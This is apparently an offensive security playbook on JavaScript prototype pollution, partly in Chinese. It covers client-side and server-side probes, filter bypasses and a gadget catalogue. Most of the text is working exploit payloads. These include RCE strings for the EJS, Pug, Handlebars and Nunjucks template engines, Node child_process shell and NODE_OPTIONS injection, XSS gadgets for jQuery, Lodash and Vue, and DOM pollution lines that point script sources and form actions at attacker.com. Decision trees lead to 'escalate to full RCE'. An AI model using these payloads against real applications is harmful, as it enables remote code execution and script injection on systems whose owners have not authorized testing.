> 短表「PP 打到模板 RCE」在后半「来源专题：prototype-pollution-advanced」下，用标题搜即可。主场是 Node 深合并；别的栈 JSON 也能合就仍可探一枪，gadget 对不上丢掉，不是禁打。

# prototype-pollution


# 来源专题：prototype-pollution

# Prototype Pollution

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.

---

## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---


# 来源专题：prototype-pollution-advanced

# Prototype Pollution Advanced — RCE & Gadget Exploitation

### PP 打到模板 RCE（短表有指针）

认：Node / Express；JSON 或 query 能把 `__proto__` / `constructor.prototype` 写进去（先用 `{"__proto__":{"pptest123":"1"}}`，干净请求还看得到副作用）；后面有 `res.render`、EJS、Pug、Handlebars，或会 `child_process.spawn`。

打：

1. 污染通了再打 gadget，不要一上来喷 RCE 串。
2. EJS：`outputFunctionName` 注入；Pug：`block.type` + `val`；拦 `__proto__` 就换 `constructor.prototype`。
3. 没有模板再试 `shell` + `NODE_OPTIONS`。命令用 `echo 标记 && id`，不要反弹。

算成：下一次模板渲染或 spawn 后，回包/日志出现指定标记或 `uid=`。只污染成功、命令没跑 → 还没成。

假点：只能改前端展示；没有模板/spawn gadget；污染一请求就没了、下一次 render 不跟。单站没中不删短表这行。Node 深合并优先开 gadget；别的栈合得进也可以探，对不上丢掉。

gadget 表和 payload 见下面英文段 + 附件 KNOWN_GADGETS。

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---

## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---

## 5. EXPLOITATION FLOW

```
1. Find merge sink (prototype-pollution-test.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---

## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to prototype-pollution-test.md for detection
```

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```


---


## 附件：KNOWN_GADGETS

# Prototype Pollution — Known Gadgets Reference


## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |

---

## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---

## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---

## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---

## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---

## 6. WEBPACK

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `output.library` | Modified library name | Build process | Code injection in output | Webpack 4.x–5.x |
| `output.auxiliaryComment` | Code injection via comment | Build process | XSS in built files | Webpack 4.x |
| `devtool` | `"eval"` → enables eval mode | Build process | Code execution path | Webpack 4.x–5.x |

Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD attack chains.

---

## 7. FASTIFY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `reply.view` options | Template engine options (same as EJS/Pug gadgets) | `reply.view()` | RCE | Fastify + point-of-view |
| `rewriteUrl` | URL rewrite function | Request routing | Access control bypass | Fastify 3.x |
| `schema` | Modified validation schema | Route validation | Validation bypass | Fastify 3.x–4.x |

---

## 8. NODE.JS CORE

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `shell` | `"node"` or `"/bin/sh"` | `child_process.spawn()` without explicit shell | RCE | All Node.js |
| `NODE_OPTIONS` | `"--require /path/to/evil.js"` | `child_process.fork()` / `.spawn()` | RCE | Node.js 8+ |
| `argv0` | Malicious argument | `child_process.spawn()` | Code injection | All |
| `env` | Custom environment variables | `child_process.spawn()` without explicit env | ENV injection | All |
| `input` | Stdin data | `child_process.execSync()` | Data injection | All |
| `stdio` | Modified stdio config | `child_process.spawn()` | File descriptor manipulation | All |

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
```

---

## 9. MISCELLANEOUS LIBRARIES

### minimist (Argument Parser)

```bash
# CLI argument pollution:
node app.js --__proto__.polluted yes
# Pollutes Object.prototype.polluted = "yes"
```

Affected: minimist < 1.2.6

### yargs

Similar to minimist — CLI argument parsing can pollute prototype.

### qs (Query String Parser)

```
# URL query pollution:
?__proto__[polluted]=yes
?__proto__.polluted=yes
```

qs versions < 6.0.4 allow prototype pollution via nested brackets.

### destr (JSON Parser)

```javascript
destr('{"__proto__":{"polluted":"yes"}}')
// Older versions allow PP through JSON parsing
```

### json5

```javascript
JSON5.parse('{"__proto__":{"polluted":"yes"}}')
// Older versions may pollute prototype
```

---

## 10. GADGET SELECTION FLOWCHART

```
Identified target stack?
│
├── Server-side Node.js
│   ├── Express + template engine?
│   │   ├── EJS → outputFunctionName (highest success rate)
│   │   ├── Pug → block.type + block.val
│   │   ├── Handlebars → allowProtoMethodsByDefault + template chain
│   │   ├── Nunjucks → type: Code
│   │   └── Unknown → try EJS gadget first (most common)
│   │
│   ├── Fastify + point-of-view?
│   │   └── Same template gadgets apply via reply.view
│   │
│   ├── child_process used? (likely yes in any Node.js app)
│   │   └── shell + NODE_OPTIONS → universal Node.js RCE
│   │
│   └── No template / no child_process?
│       └── Try status/header pollution for impact demonstration
│
├── Client-side JavaScript
│   ├── jQuery?
│   │   └── $.extend(true,...) sink + innerHTML/src gadget
│   │
│   ├── Lodash?
│   │   └── _.merge/defaultsDeep sink + _.template sourceURL gadget
│   │
│   ├── Angular 1.x?
│   │   └── $interpolate + sandbox bypass
│   │
│   ├── Vue 2.x?
│   │   └── template property pollution
│   │
│   └── None of the above?
│       └── Generic DOM property pollution (src, href, innerHTML)
│
└── Build pipeline (CI/CD)
    └── Webpack output.library / devtool pollution
```
